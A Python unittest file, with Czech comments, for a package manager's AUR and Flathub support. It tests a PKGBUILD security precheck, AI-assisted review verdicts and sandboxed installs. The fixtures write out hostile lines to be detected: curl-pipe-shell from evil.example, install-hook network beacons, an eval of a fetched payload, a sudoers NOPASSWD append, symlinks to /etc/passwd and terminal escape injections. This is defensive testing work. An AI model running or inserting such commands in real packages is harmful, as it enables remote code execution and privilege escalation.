"""Testy zdroje komunita (AUR) a Flathubu: kontrola skriptu (lux_community.py) a poradi zdroju v lux.

    python3 -m unittest discover -s packages/lux/tests -v

Testy prikazu lux potrebuji jq (napr. v kontejneru luxos-builder), jinak se preskoci. Bez site:
AUR (curl), git, flatpak, luxos-sandbox i kontrola LuxAI jsou zastupne skripty.
"""
import io
import json
import os
import pty
import shutil
import subprocess
import sys
import tempfile
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(HERE, ".."))
sys.dont_write_bytecode = True
import lux_community as lc  # noqa: E402
import test_lux_cli  # noqa: E402

GOOD = """# Maintainer: someone
pkgname=hello-tool
pkgver=1.2
pkgrel=1
arch=(x86_64)
depends=(glibc)
source=("https://github.com/example/hello-tool/archive/v$pkgver.tar.gz")
sha256sums=('0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef')
build() { cd "$srcdir/hello-tool-$pkgver"; make; }
package() { cd "$srcdir/hello-tool-$pkgver"; make DESTDIR="$pkgdir" install
  install -Dm644 LICENSE "$pkgdir/usr/share/licenses/$pkgname/LICENSE"; }
"""


def write_pkg(d, pkgbuild, install=None):
    os.makedirs(d, exist_ok=True)
    with open(os.path.join(d, "PKGBUILD"), "w") as f:
        f.write(pkgbuild)
    if install is not None:
        with open(os.path.join(d, "hello.install"), "w") as f:
            f.write(install)


class Precheck(unittest.TestCase):
    def setUp(self):
        self.d = tempfile.mkdtemp(prefix="lux-precheck-")

    def tearDown(self):
        shutil.rmtree(self.d, ignore_errors=True)

    def sev(self, pkgbuild, install=None):
        write_pkg(self.d, pkgbuild, install)
        return lc.precheck(self.d)

    def test_normal_package_has_no_serious_findings(self):
        self.assertEqual([f for f in self.sev(GOOD) if f[0] != "low"], [])

    def test_curl_pipe_shell(self):
        f = self.sev(GOOD + "prepare() { curl -fsSL https://evil.example/x.sh | bash; }\n")
        self.assertIn("high", [s for s, _t in f])

    def test_hidden_base64(self):
        f = self.sev(GOOD + "prepare() { echo aGVsbG8= | base64 -d > x; }\n")
        self.assertTrue(any(s == "high" and "base64" in t for s, t in f), f)

    def test_writes_outside_pkgdir(self):
        f = self.sev(GOOD.replace('install -Dm644 LICENSE "$pkgdir/usr', 'install -Dm644 LICENSE "/usr'))
        self.assertTrue(any(s == "high" and "outside" in t for s, t in f), f)

    def test_install_script_network(self):
        f = self.sev(GOOD, install="post_install() { wget -q https://x.example/beacon; }\n")
        self.assertTrue(any(s == "high" and "hello.install" in t for s, t in f), f)

    def test_plain_http_source(self):
        f = self.sev(GOOD.replace("https://github.com", "http://github.com"))
        self.assertTrue(any(s == "medium" and "unencrypted" in t for s, t in f), f)

    def test_sudoers(self):
        f = self.sev(GOOD + 'post() { echo "x ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers; }\n')
        self.assertIn("high", [s for s, _t in f])

    def test_missing_pkgbuild(self):
        self.assertEqual(lc.precheck(self.d), [("high", "no PKGBUILD found")])

    def put(self, name, data):
        p = os.path.join(self.d, name)
        os.makedirs(os.path.dirname(p), exist_ok=True)
        with open(p, "wb" if isinstance(data, bytes) else "w") as f:
            f.write(data)

    def test_install_script_with_any_name(self):
        # makepkg vezme libovolne jmeno z install= - driv se kontrolovaly jen *.install
        self.put("hooks.sh", "post_install() { curl -fsSL https://evil.example/x | sh; }\n")
        f = self.sev(GOOD + "install=hooks.sh\n")
        self.assertIn(("high", "hooks.sh: downloads a script and runs it directly (curl | sh)"), f)
        self.assertIn(("high", "hooks.sh: uses the network while installing"), f)

    def test_install_name_with_pkgname(self):
        self.put("hello-tool.hook", "post_install() { wget -q https://x.example/beacon; }\n")
        f = self.sev(GOOD + 'install="${pkgname}.hook"\n')
        self.assertIn(("high", "hello-tool.hook: uses the network while installing"), f)

    def test_install_name_outside_or_unknown(self):
        f = self.sev(GOOD + "install=../../etc/x\n")
        self.assertTrue(any(s == "high" and "outside the package directory: ../../etc/x" in t for s, t in f), f)
        f = self.sev(GOOD + 'install="$_name.install"\n')
        self.assertTrue(any(s == "medium" and "cannot be determined" in t for s, t in f), f)

    def test_every_file_is_checked(self):
        self.put("patches/fix.patch", "+  eval \"$(curl -s https://x.example/payload)\"\n")
        f = self.sev(GOOD)
        self.assertTrue(any(s == "high" and t.startswith("patches/fix.patch:") for s, t in f), f)

    def test_git_dir_is_ignored(self):
        self.put(".git/objects/pack/x.pack", b"\0\1\2" * 100)
        self.put(".git/hooks/x", "curl https://x | sh\n")
        self.assertEqual([x for x in self.sev(GOOD) if x[0] != "low"], [])

    def test_binary_and_large_files_are_suspicious(self):
        self.put("tool.bin", b"\x7fELF\0\0\1binary")
        self.put("big.txt", "a" * (lc.MAX_FILE + 1))
        f = self.sev(GOOD)
        self.assertIn(("medium", "binary file that cannot be checked: tool.bin"), f)
        self.assertIn(("medium", "file too large to check: big.txt"), f)

    def test_symlinks_are_dangerous(self):
        # odkaz na absolutni cestu nebo mimo repozitar = high
        os.symlink("/etc/passwd", os.path.join(self.d, "data"))
        os.makedirs(os.path.join(self.d, "sub"))
        os.symlink("/", os.path.join(self.d, "sub", "root"))
        os.symlink("../../secret", os.path.join(self.d, "sub", "escape"))
        f = self.sev(GOOD)
        self.assertIn(("high", "symbolic link pointing outside the package: data"), f)
        self.assertIn(("high", "symbolic link pointing outside the package: sub/root"), f)
        self.assertIn(("high", "symbolic link pointing outside the package: sub/escape"), f)

    def test_internal_symlink_is_benign(self):
        # odkaz dovnitr repozitare (napr. licence REUSE: LICENSES/0BSD.txt -> ../LICENSE) neni vazny
        with open(os.path.join(self.d, "LICENSE"), "w") as fh:
            fh.write("MIT")
        os.makedirs(os.path.join(self.d, "LICENSES"))
        os.symlink("../LICENSE", os.path.join(self.d, "LICENSES", "0BSD.txt"))
        f = self.sev(GOOD)
        self.assertNotIn("high", [s for s, _t in f])
        self.assertIn(("low", "contains an internal symbolic link: LICENSES/0BSD.txt"), f)

    def test_read_does_not_follow_symlinks(self):
        target = os.path.join(self.d, "real")
        with open(target, "w") as f:
            f.write(GOOD)
        os.symlink(target, os.path.join(self.d, "PKGBUILD"))
        self.assertEqual(lc.read(os.path.join(self.d, "PKGBUILD")), "")
        self.assertEqual(lc.precheck(self.d), [("high", "no PKGBUILD found")])
        os.mkfifo(os.path.join(self.d, "fifo"))
        self.assertEqual(lc.read(os.path.join(self.d, "fifo")), "")      # necte (a neceka)


class Fixtures(unittest.TestCase):
    """Precheck na celem korpusu (packages/lux/tests/fixtures/aur-eval) - bez site.
    Skodlive vzorky musi dat aspon medium, neskodne nikdy high."""
    FIX = os.path.join(HERE, "fixtures", "aur-eval")

    def _dirs(self, kind):
        base = os.path.join(self.FIX, kind)
        return [(n, os.path.join(base, n)) for n in sorted(os.listdir(base))
                if os.path.isdir(os.path.join(base, n))]

    def test_malicious_fixtures_are_flagged(self):
        dirs = self._dirs("malicious")
        self.assertGreaterEqual(len(dirs), 20)
        for name, d in dirs:
            sev = {s for s, _t in lc.precheck(d)}
            self.assertTrue("high" in sev or "medium" in sev,
                            f"{name}: precheck ji neoznacil (nalezy: {lc.precheck(d)})")

    def test_benign_fixtures_have_no_high(self):
        dirs = self._dirs("benign")
        self.assertGreaterEqual(len(dirs), 10)
        for name, d in dirs:
            highs = [t for s, t in lc.precheck(d) if s == "high"]
            self.assertEqual(highs, [], f"{name}: falesny high nalez: {highs}")


class Verdict(unittest.TestCase):
    def test_parse(self):
        self.assertEqual(lc.parse_verdict('```json\n{"verdict": "safe", "reasons": ["ok"]}\n```'), ("safe", ["ok"]))
        self.assertEqual(lc.parse_verdict('{"verdict": "maybe"}'), (None, []))
        self.assertEqual(lc.parse_verdict("no json"), (None, []))

    def test_combination(self):
        d = tempfile.mkdtemp(prefix="lux-review-")
        self.addCleanup(shutil.rmtree, d, True)
        write_pkg(d, GOOD)
        orig = lc.luxai_review
        self.addCleanup(setattr, lc, "luxai_review", orig)
        # bez LuxAI nikdy "safe"
        lc.luxai_review = lambda n, dd: (None, [], "offline")
        self.assertEqual(lc.review(d)["verdict"], "unreviewed")
        lc.luxai_review = lambda n, dd: ("safe", ["fine"], "")
        self.assertEqual(lc.review(d)["verdict"], "safe")
        # LuxAI rekne safe, ale pevne pravidlo najde neco vazneho -> pravidlo vyhrava
        write_pkg(d, GOOD + "prepare() { curl -s https://x.example/a | sh; }\n")
        self.assertEqual(lc.review(d)["verdict"], "dangerous")
        write_pkg(d, GOOD.replace("https://github.com", "http://github.com"))
        self.assertEqual(lc.review(d)["verdict"], "suspicious")
        # binarni soubor: ani "safe" od LuxAI, ani bez LuxAI neni verdikt mirnejsi nez "suspicious"
        write_pkg(d, GOOD)
        with open(os.path.join(d, "blob"), "wb") as f:
            f.write(b"\0\1\2")
        self.assertEqual(lc.review(d)["verdict"], "suspicious")
        lc.luxai_review = lambda n, dd: (None, [], "offline")
        self.assertEqual(lc.review(d)["verdict"], "suspicious")

    def test_print_review_strips_control_chars(self):
        r = {"verdict": "suspicious", "reasons": ["bad\x1b]0;owned\x07 host\x9b2J"],
             "findings": [("medium", "file\x1b[2J.sh: x\ny")], "note": "n\x1bote"}
        buf = io.StringIO()
        orig = sys.stdout
        sys.stdout = buf
        try:
            lc.print_review(r)
        finally:
            sys.stdout = orig
        out = buf.getvalue()
        for c in ("\x1b", "\x07", "\x9b"):
            self.assertNotIn(c, out)
        self.assertEqual(len(out.splitlines()), 4, out)      # zadny podvrzeny radek (\n)
        self.assertIn("FINDING\tmedium\tfile [2J.sh: x y", out)

    def test_luxai_signed_out_and_request(self):
        mod_dir = tempfile.mkdtemp(prefix="lux-acc-")
        self.addCleanup(shutil.rmtree, mod_dir, True)
        with open(os.path.join(mod_dir, "luxai_account.py"), "w") as f:
            f.write("import json, os\nORIGIN='https://lux-ai.cz'\nSENT=[]\n"
                    "def load():\n    return json.loads(os.environ.get('FAKE_ACC') or 'null')\n"
                    "def request(method, path, body=None, token=None, origin=None, timeout=20):\n"
                    "    SENT.append((method, path, body, token))\n"
                    "    return {'choices': [{'message': {'content': os.environ['FAKE_ANSWER']}}]}\n")
        d = tempfile.mkdtemp(prefix="lux-review-")
        self.addCleanup(shutil.rmtree, d, True)
        write_pkg(d, GOOD)
        old = dict(os.environ)
        self.addCleanup(lambda: (os.environ.clear(), os.environ.update(old)))
        os.environ["LUX_LUXAI_ACCOUNT_DIR"] = mod_dir
        sys.modules.pop("luxai_account", None)
        self.addCleanup(sys.modules.pop, "luxai_account", None)
        v, _r, note = lc.luxai_review("hello-tool", d)
        self.assertIsNone(v)
        self.assertIn("signed in", note)
        os.environ["FAKE_ACC"] = '{"sessionToken": "tok"}'
        os.environ["FAKE_ANSWER"] = '{"verdict": "suspicious", "reasons": ["odd host"]}'
        sent_all = sys.modules["luxai_account"].SENT
        del sent_all[:]
        v, reasons, _n = lc.luxai_review("hello-tool", d)
        self.assertEqual((v, reasons), ("suspicious", ["odd host"]))
        # dva nezavisle modely: nejdriv Lite, pak Flash (Lite nerekl "dangerous")
        self.assertEqual([s[2]["model"] for s in sent_all], list(lc.LUXAI_MODELS))
        sent = sent_all[-1]
        self.assertEqual(sent[1], lc.CHAT_PATH)
        self.assertNotIn("tools", sent[2])
        self.assertIn("pkgname=hello-tool", sent[2]["messages"][1]["content"])
        # "dangerous" od Lite uz dalsi model nevola (nejvyssi zavaznost)
        del sent_all[:]
        os.environ["FAKE_ANSWER"] = '{"verdict": "dangerous", "reasons": ["bad"]}'
        v, _r, _n = lc.luxai_review("hello-tool", d)
        self.assertEqual(v, "dangerous")
        self.assertEqual([s[2]["model"] for s in sent_all], ["lite"])
        # LuxAI vidi vsechny soubory (i install= s libovolnym jmenem); co nevidi, nesmi byt "safe"
        with open(os.path.join(d, "hooks.sh"), "w") as f:
            f.write("post_install() { echo hi; }\n")
        with open(os.path.join(d, "blob"), "wb") as f:
            f.write(b"\0\1")
        os.environ["FAKE_ANSWER"] = '{"verdict": "safe", "reasons": []}'
        v, reasons, _n = lc.luxai_review("hello-tool", d)
        content = sys.modules["luxai_account"].SENT[-1][2]["messages"][1]["content"]
        self.assertIn("=== hooks.sh ===\npost_install()", content)
        self.assertIn("=== blob === (not shown", content)
        self.assertEqual(v, "suspicious")


class Flathub(unittest.TestCase):
    def test_candidates(self):
        rows = [("us.zoom.Zoom", "Zoom", ""), ("com.daniel15.wcc", "WebCamControl", ""),
                ("org.videolan.VLC", "VLC", "")]
        self.assertEqual(lc.flathub_candidates("zoom", rows), ["us.zoom.Zoom"])
        self.assertEqual(lc.flathub_candidates("vlc", rows), ["org.videolan.VLC"])
        self.assertEqual(lc.flathub_candidates("org.videolan.vlc", rows), ["org.videolan.VLC"])
        self.assertEqual(lc.flathub_candidates("cam", rows), [])

    def test_app_id_needs_no_network(self):
        self.assertEqual(lc.flathub("us.zoom.Zoom"), ("ok", ["us.zoom.Zoom"]))


AUR_STUBS = {
    # AUR RPC: info o balicich podle FAKE_AUR (JSON {nazev: {Depends: [...]}}), hledani prazdne
    "curl": r"""#!/bin/bash
printf '%s\n' "$*" >>"$LOG/curl.log"
url=${@: -1}
python3 - "$url" <<'P'
import json, os, sys, urllib.parse
url = sys.argv[1]
aur = json.loads(os.environ.get("FAKE_AUR") or "{}")
if "/info?" in url:
    q = urllib.parse.parse_qs(urllib.parse.urlsplit(url).query).get("arg[]", [])
    res = [dict({"Name": n, "PackageBase": n, "Version": "1.0-1"}, **aur[n]) for n in q if n in aur]
    print(json.dumps({"results": res}))
else:
    print(json.dumps({"results": []}))
P
""",
    # git clone URL DIR -> skutecny repozitar s PKGBUILD z FAKE_PKGBUILD (+ odkaz FAKE_SYMLINK);
    # fetch/reset bez site nic nedela, ostatni (archive, ls-tree) skutecny git
    "git": r"""#!/bin/bash
printf '%s\n' "$*" >>"$LOG/git.log"
export GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_NOSYSTEM=1
case " $* " in
  *" clone "*)
    for a; do last=$a; done
    /usr/bin/git init -q "$last" || exit 1
    printf '%s' "${FAKE_PKGBUILD:-pkgname=x}" >"$last/PKGBUILD"
    [[ -n ${FAKE_SYMLINK-} ]] && ln -s "$FAKE_SYMLINK" "$last/link"
    /usr/bin/git -C "$last" add -A && /usr/bin/git -C "$last" -c user.name=t -c user.email=t@t.invalid \
        -c commit.gpgsign=false commit -qm init ;;
  *" fetch "*|*" reset "*) exit 0 ;;
  *) exec /usr/bin/git "$@" ;;
esac
""",
    "luxos-sandbox": r"""#!/bin/bash
printf '%s\n' "$*" >>"$LOG/luxos-sandbox.log"
case $1 in
  status) echo '{"exists": true}' ;;
  build-install) tar -tf - | sort >>"$LOG/sandbox-tar.log" ;;
esac
exit 0
""",
    "lux_community.py": r"""#!/bin/bash
printf '%s\n' "$*" >>"$LOG/lux_community.log"
case $1 in
  review) printf 'VERDICT\t%s\nREASON\tsome reason\n' "${FAKE_VERDICT:-safe}" ;;
  flathub) if [[ -n ${FAKE_FLATHUB-} ]]; then printf 'ok\t%s\n' "$FAKE_FLATHUB"; else echo none; exit 1; fi ;;
  flathub-size) echo '{"download": 1000, "installed": 2000, "runtime": "org.freedesktop.Platform/x86_64/25.08", "runtime_download": 10, "runtime_installed": 20, "runtime_present": false}' ;;
  flathub-search) exit 1 ;;
esac
""",
    "flatpak": r"""#!/bin/bash
printf '%s\n' "$*" >>"$LOG/flatpak.log"
case $1 in
  remote-list) echo flathub ;;
  list) printf '%b\n' "${FAKE_FLATPAK_LIST:-us.zoom.Zoom\tZoom}" ;;
esac
# s FAKE_MENU_DELAY jako skutecny Flatpak + luxos-flatpak-apps.path: export hned, odkaz pro nabidku
# (luxos-apps-sync ze systemd) o chvili pozdeji
if [[ -n ${FAKE_MENU_DELAY-} && ($1 == install || $1 == uninstall) && $2 != --unused ]]; then
  id=${*: -1}; exp=$LUX_FLATPAK_EXPORTS/applications; menu=$LUX_APPS_DIR/applications
  mkdir -p "$exp" "$menu"
  if [[ $1 == install ]]; then
    echo "[Desktop Entry]" >"$exp/$id.desktop"
    (sleep "$FAKE_MENU_DELAY"; ln -s "$exp/$id.desktop" "$menu/$id.desktop") >/dev/null 2>&1 &
  else
    rm -f "$exp/$id.desktop"
    (sleep "$FAKE_MENU_DELAY"; rm -f "$menu/$id.desktop") >/dev/null 2>&1 &
  fi
fi
exit 0
""",
    "makepkg": "#!/bin/bash\nprintf '%s\\n' \"$*\" >>\"$LOG/makepkg.log\"\nexit 0\n",
}


@unittest.skipUnless(shutil.which("jq"), "jq neni k dispozici (spustit v kontejneru luxos-builder)")
class CommunityCLI(unittest.TestCase):
    # pomocne metody zakladnich testu (bez jejich testu)
    tearDown = test_lux_cli.CLI.tearDown
    lux = test_lux_cli.CLI.lux
    calls = test_lux_cli.CLI.calls
    backend = test_lux_cli.CLI.backend

    def setUp(self):
        test_lux_cli.CLI.setUp(self)
        os.unlink(os.path.join(self.bin, "jq"))     # skutecne jq
        for name, body in AUR_STUBS.items():
            p = os.path.join(self.bin, name)
            with open(p, "w") as f:
                f.write(body)
            os.chmod(p, 0o755)
        self.env.update({"LUX_COMMUNITY": os.path.join(self.bin, "lux_community.py"),
                         "LUX_SANDBOX": os.path.join(self.bin, "luxos-sandbox"),
                         "FAKE_AUR": json.dumps({"hello-tool": {"Depends": ["glibc", "libfoo"]}}),
                         "FAKE_PKGBUILD": GOOD, "NOT_IN_REPO": "hello-tool zoom"})
        # lux-config ze zakladni tridy vypina AUR a Flatpak; tady zapnout
        with open(os.path.join(self.bin, "lux-config"), "w") as f:
            f.write("#!/bin/bash\n[[ $1 == env ]] && printf 'AUR=1\\nREVIEW_PKGBUILD=1\\nFLATPAK=1\\nCLEAN_KEEP=3\\n'\n"
                    "exit 0\n")

    def lux_tty(self, *args, env=None, answers=""):
        """lux se vstupem z terminalu (pty); odpovedi na otazky predem v bufferu terminalu."""
        e = dict(self.env, **(env or {}))
        master, slave = pty.openpty()
        try:
            if answers:
                os.write(master, answers.encode())
            r = subprocess.run(["bash", test_lux_cli.LUX] + list(args), env=e, capture_output=True, text=True,
                               stdin=slave, timeout=60)
        finally:
            os.close(slave)
            os.close(master)
        return r.returncode, r.stdout + r.stderr

    def test_flathub_before_aur(self):
        rc, out = self.lux("-y", "install", "zoom", env={"FAKE_FLATHUB": "us.zoom.Zoom",
                                                         "FAKE_AUR": json.dumps({"zoom": {}})})
        self.assertEqual(rc, 0, out)
        self.assertIn("install -y --noninteractive flathub us.zoom.Zoom", self.calls("flatpak"))
        self.assertEqual(self.calls("git"), [])                 # AUR se vubec nestahuje
        self.assertIn("Download:", out)
        self.assertIn("org.freedesktop.Platform", out)

    def test_aur_goes_to_sandbox_by_default(self):
        rc, out = self.lux("-y", "install", "hello-tool")
        self.assertEqual(rc, 0, out)
        self.assertTrue(any("review" in c for c in self.calls("lux_community")))
        sb = [c for c in self.calls("luxos-sandbox") if c.startswith("build-install")]
        self.assertEqual(len(sb), 1, out)
        self.assertIn("hello-tool", sb[0])
        self.assertIn("--deps", sb[0])
        self.assertIn("./PKGBUILD", self.calls("sandbox-tar"))
        self.assertNotIn("./.git/", self.calls("sandbox-tar"))
        self.assertEqual(self.calls("makepkg"), [])             # v systemu se nic nesestavuje
        self.assertIn("community", out)

    def test_dangerous_not_installed_with_yes(self):
        rc, out = self.lux("-y", "install", "hello-tool", env={"FAKE_VERDICT": "dangerous"})
        self.assertNotEqual(rc, 0)
        self.assertFalse(any(c.startswith("build-install") for c in self.calls("luxos-sandbox")))
        self.assertEqual(self.calls("makepkg"), [])

    def test_system_needs_clean_check_with_yes(self):
        env = {"FAKE_VERDICT": "unreviewed"}
        rc, out = self.lux_tty("-y", "--system", "install", "hello-tool", env=env)
        self.assertNotEqual(rc, 0)
        self.assertEqual(self.calls("makepkg"), [])
        self.assertIn("confirmation", out)

    def test_system_explicit_and_safe(self):
        # base-devel "nainstalovano" (lux-engine -Qq vraci 0)
        rc, out = self.lux_tty("-y", "--system", "install", "hello-tool")
        self.assertEqual(rc, 0, out)
        self.assertEqual(len(self.calls("makepkg")), 1, out)
        self.assertFalse(any(c.startswith("build-install") for c in self.calls("luxos-sandbox")))

    def test_system_needs_terminal(self):
        rc, out = self.lux("-y", "--system", "install", "hello-tool")
        self.assertNotEqual(rc, 0)
        self.assertIn("only from an interactive terminal", out)
        self.assertEqual(self.calls("git"), [])
        self.assertEqual(self.calls("makepkg"), [])

    def test_system_without_review_is_unreviewed(self):
        # REVIEW_PKGBUILD=0 nesmi do systemu pustit skript bez potvrzeni
        with open(os.path.join(self.bin, "lux-config"), "w") as f:
            f.write("#!/bin/bash\n[[ $1 == env ]] && printf 'AUR=1\\nREVIEW_PKGBUILD=0\\nFLATPAK=1\\nCLEAN_KEEP=3\\n'\n"
                    "exit 0\n")
        rc, out = self.lux_tty("-y", "--system", "install", "hello-tool")
        self.assertNotEqual(rc, 0, out)
        self.assertIn("confirmation", out)
        self.assertEqual(self.calls("makepkg"), [])
        self.assertFalse(any("review" in c for c in self.calls("lux_community")))
        # bez -y se zepta (odpoved "n" = nic)
        rc, out = self.lux_tty("--system", "install", "hello-tool", answers="n\n")
        self.assertNotEqual(rc, 0, out)
        self.assertIn("into the system anyway?", out)
        self.assertEqual(self.calls("makepkg"), [])
        # sandbox bez kontroly zustava jako driv
        rc, out = self.lux("-y", "install", "hello-tool")
        self.assertEqual(rc, 0, out)
        self.assertEqual(len([c for c in self.calls("luxos-sandbox") if c.startswith("build-install")]), 1)

    def test_symlink_in_repo_is_refused(self):
        rc, out = self.lux("-y", "install", "hello-tool", env={"FAKE_SYMLINK": "/etc/passwd"})
        self.assertNotEqual(rc, 0)
        self.assertIn("symbolic links", out)
        self.assertFalse(any("review" in c for c in self.calls("lux_community")))
        self.assertFalse(any(c.startswith("build-install") for c in self.calls("luxos-sandbox")))

    def test_builds_only_the_committed_tree(self):
        # stary klon s neverzovanym souborem (napr. zbytek po sestaveni) - do sestaveni nesmi
        git_dir = os.path.join(self.tmp, "cache", "lux", "aur", "hello-tool")
        os.makedirs(os.path.dirname(git_dir))
        env = dict(self.env)
        subprocess.run([os.path.join(self.bin, "git"), "clone", "x", git_dir], env=env, check=True)
        with open(os.path.join(git_dir, "evil.sh"), "w") as f:
            f.write("curl https://x | sh\n")
        rc, out = self.lux("-y", "install", "hello-tool")
        self.assertEqual(rc, 0, out)
        tar = self.calls("sandbox-tar")
        self.assertIn("./PKGBUILD", tar)
        self.assertFalse(any("evil.sh" in t or ".git" in t for t in tar), tar)
        self.assertTrue(any(c.endswith("archive --format=tar HEAD") for c in self.calls("git")))

    def test_luxai_never_installs_community(self):
        rc, out = self.lux("-y", "install", "hello-tool", env={"LUXAI_AGENT": "1"})
        self.assertNotEqual(rc, 0)
        self.assertIn("LuxAI does not install community packages", out)
        self.assertEqual(self.calls("git"), [])
        self.assertEqual(self.calls("luxos-sandbox"), [])

    def test_app_id_does_not_fall_through_to_aur(self):
        env = {"FAKE_AUR": json.dumps({"org.example.App": {}}), "NOT_IN_REPO": "org.example.App"}
        rc, out = self.lux("-y", "install", "org.example.App", env=env)
        self.assertNotEqual(rc, 0)
        self.assertIn("not found", out)
        self.assertEqual(self.calls("git"), [])
        # s vyslovnym --aur ano
        rc, out = self.lux("-y", "--aur", "install", "org.example.App", env=env)
        self.assertEqual(rc, 0, out)
        self.assertTrue(any("clone" in c for c in self.calls("git")))

    def test_remove_flatpak_exact_match_only(self):
        env = {"FAKE_FLATPAK_LIST": "us.zoom.Zoom\\tZoom Workplace\\norg.example.Notes\\tNotes"}
        rc, out = self.lux("-y", "remove", "zoom", env=env)
        self.assertFalse(any(c.startswith("uninstall -y") for c in self.calls("flatpak")), out)
        self.assertTrue(any("zoom" in c for c in self.backend()), out)    # jde na bezny balik
        rc, out = self.lux("-y", "remove", "zoom workplace", "ORG.EXAMPLE.NOTES", env=env)
        self.assertEqual(rc, 0, out)
        self.assertIn("uninstall -y --noninteractive us.zoom.Zoom org.example.Notes", self.calls("flatpak"))

    def test_remove_flatpak_asks(self):
        rc, out = self.lux("remove", "zoom")
        self.assertNotEqual(rc, 0)
        self.assertFalse(any(c.startswith("uninstall") for c in self.calls("flatpak")), out)
        rc, out = self.lux_tty("remove", "zoom", answers="n\n")
        self.assertNotEqual(rc, 0)
        self.assertIn("Remove us.zoom.Zoom?", out)
        self.assertFalse(any(c.startswith("uninstall") for c in self.calls("flatpak")), out)
        rc, out = self.lux_tty("remove", "zoom", answers="y\n")
        self.assertEqual(rc, 0, out)
        self.assertIn("uninstall -y --noninteractive us.zoom.Zoom", self.calls("flatpak"))

    def test_remove_flatpak_and_unused_runtimes(self):
        rc, out = self.lux("-y", "remove", "zoom")
        self.assertEqual(rc, 0, out)
        fl = self.calls("flatpak")
        self.assertIn("uninstall -y --noninteractive us.zoom.Zoom", fl)
        self.assertIn("uninstall --unused -y --noninteractive", fl)
        self.assertFalse(any(c.startswith("remove") for c in self.backend()))

    # --- aplikace z Flathubu hned v Launchpadu a nabidce (luxos-apps-sync z luxos-desktop) ---
    def fake_sync(self):
        p = os.path.join(self.bin, "luxos-apps-sync")
        with open(p, "w") as f:
            f.write('#!/bin/bash\nprintf "%s\\n" "$EUID" >>"$LOG/luxos-apps-sync.log"\n')
        os.chmod(p, 0o755)

    def test_flatpak_install_waits_for_menu_link(self):
        """lux skonci, az kdyz ma nova aplikace odkaz v /var/lib/luxos/apps (vytvari ho systemd)."""
        self.fake_sync()
        rc, out = self.lux("-y", "install", "zoom", env={"FAKE_FLATHUB": "us.zoom.Zoom", "FAKE_MENU_DELAY": "0.6"})
        self.assertEqual(rc, 0, out)
        link = os.path.join(self.tmp, "luxos-apps", "applications", "us.zoom.Zoom.desktop")
        self.assertTrue(os.path.islink(link), "lux returned before the menu link existed")
        self.assertEqual(self.calls("luxos-apps-sync"), [])     # bez rootu ho spousti jen systemd

    def test_flatpak_remove_waits_for_menu_link(self):
        self.fake_sync()
        menu = os.path.join(self.tmp, "luxos-apps", "applications")
        os.makedirs(menu)
        os.symlink("/nonexistent/us.zoom.Zoom.desktop", os.path.join(menu, "us.zoom.Zoom.desktop"))
        rc, out = self.lux("-y", "remove", "zoom", env={"FAKE_MENU_DELAY": "0.6"})
        self.assertEqual(rc, 0, out)
        self.assertFalse(os.path.lexists(os.path.join(menu, "us.zoom.Zoom.desktop")))

    def test_flatpak_menu_wait_is_bounded(self):
        """Bez sluzby (starsi luxos-desktop, chroot) lux pocka nejvys ~3 s a skonci uspesne."""
        import time
        self.fake_sync()
        exp = os.path.join(self.tmp, "flatpak-exports", "applications")
        os.makedirs(exp)
        t = time.monotonic()
        rc, out = self.lux("-y", "install", "zoom", env={"FAKE_FLATHUB": "us.zoom.Zoom", "FAKE_MENU_DELAY": "8"})
        self.assertEqual(rc, 0, out)
        self.assertTrue(2.5 < time.monotonic() - t < 8, time.monotonic() - t)

    def test_flatpak_without_luxos_desktop_no_wait(self):
        """Bez luxos-apps-sync (jine prostredi) se na nic neceka."""
        rc, out = self.lux("-y", "install", "zoom", env={"FAKE_FLATHUB": "us.zoom.Zoom", "FAKE_MENU_DELAY": "2"})
        self.assertEqual(rc, 0, out)
        self.assertFalse(os.path.lexists(os.path.join(self.tmp, "luxos-apps", "applications", "us.zoom.Zoom.desktop")))

    @unittest.skipUnless(shutil.which("unshare"), "unshare missing")
    def test_flatpak_update_as_root_runs_sync(self):
        self.fake_sync()
        r = subprocess.run(["unshare", "-r", "true"], capture_output=True)
        if r.returncode:
            self.skipTest("user namespaces not available")
        rc, out = self.lux("-y", "remove", "zoom", prefix=("unshare", "-r"))
        self.assertEqual(rc, 0, out)
        self.assertEqual(self.calls("luxos-apps-sync"), ["0"])


if __name__ == "__main__":
    unittest.main()
